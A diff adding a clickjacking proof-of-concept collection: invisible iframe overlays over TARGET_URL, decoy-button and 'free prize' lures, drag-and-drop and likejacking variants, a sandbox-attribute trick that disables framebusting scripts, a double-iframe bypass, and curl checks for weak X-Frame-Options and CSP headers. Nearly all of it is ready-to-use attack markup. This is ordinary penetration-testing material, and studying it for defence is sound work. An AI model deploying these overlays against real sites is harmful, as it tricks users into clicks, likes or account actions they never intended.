@@ -1,0 +1,64 @@
+# Basic transparent-iframe overlay PoC
+# Replace TARGET_URL with the page being tested. Classic OWASP-style PoC.
+<style>
+  iframe {
+    width: 1000px;
+    height: 1000px;
+    position: absolute;
+    top: -10px;
+    left: -10px;
+    z-index: 2;
+    opacity: 0;
+  }
+</style>
+<div>Click me</div>
+<iframe src="TARGET_URL"></iframe>
+
+# Decoy-button overlay variant (align a fake button under the real target button)
+<style>
+  .decoy { position: absolute; top: 300px; left: 450px; z-index: 1; }
+  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
+</style>
+<button class="decoy">Claim your free prize</button>
+<iframe src="TARGET_URL"></iframe>
+
+# Partial-opacity debug version (use while aligning the overlay, then set opacity back to ~0)
+<iframe src="TARGET_URL" style="opacity:0.3; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
+
+# Drag-and-drop clickjacking (lure a drag action into a framed drop target)
+<style>
+  iframe { position: absolute; top: -200px; left: -200px; opacity: 0; width: 1200px; height: 1200px; }
+  #bait { position: absolute; top: 150px; left: 150px; width: 150px; height: 40px; background: #eee; }
+</style>
+<div id="bait" draggable="true">Drag this coupon</div>
+<iframe src="TARGET_URL"></iframe>
+
+# Double iframe bypass attempt against naive same-origin framebusting
+# (only relevant when the target's own anti-framing JS checks window.top === window.self
+#  from within a nested same-origin wrapper; does nothing against header-based X-Frame-Options/CSP)
+<iframe src="about:blank" id="outer">
+  <!-- outer.contentDocument then has TARGET_URL injected into a nested iframe at runtime -->
+</iframe>
+
+# Likejacking-style pattern: invisible iframe aligned over a single social action button
+<style>
+  iframe { position: absolute; top: -480px; left: -10px; width: 1000px; height: 1000px; opacity: 0; z-index: 2; }
+</style>
+<p style="position:relative;z-index:1;">You won't believe what happens next, click to continue</p>
+<iframe src="TARGET_URL"></iframe>
+
+# Header checks to run against the target before building a PoC
+curl -sI https://TARGET_HOST/ | grep -i "x-frame-options"
+curl -sI https://TARGET_HOST/ | grep -i "content-security-policy"
+
+# Weak/missing header values that still allow framing
+X-Frame-Options: ALLOWALL
+# (non-standard / ignored by most browsers — functionally equivalent to missing)
+Content-Security-Policy: frame-ancestors *
+Content-Security-Policy: frame-ancestors 'self' https://attacker.example.com
+# (misconfigured allowlist that includes an attacker-controlled or overly broad origin)
+
+# Client-side-only framebuster that can be neutralized via the sandbox attribute
+<iframe src="TARGET_URL" sandbox="allow-forms allow-scripts"></iframe>
+# sandbox without allow-top-navigation prevents the framed page's own
+# "if (top !== self) top.location = self.location;" framebuster from executing
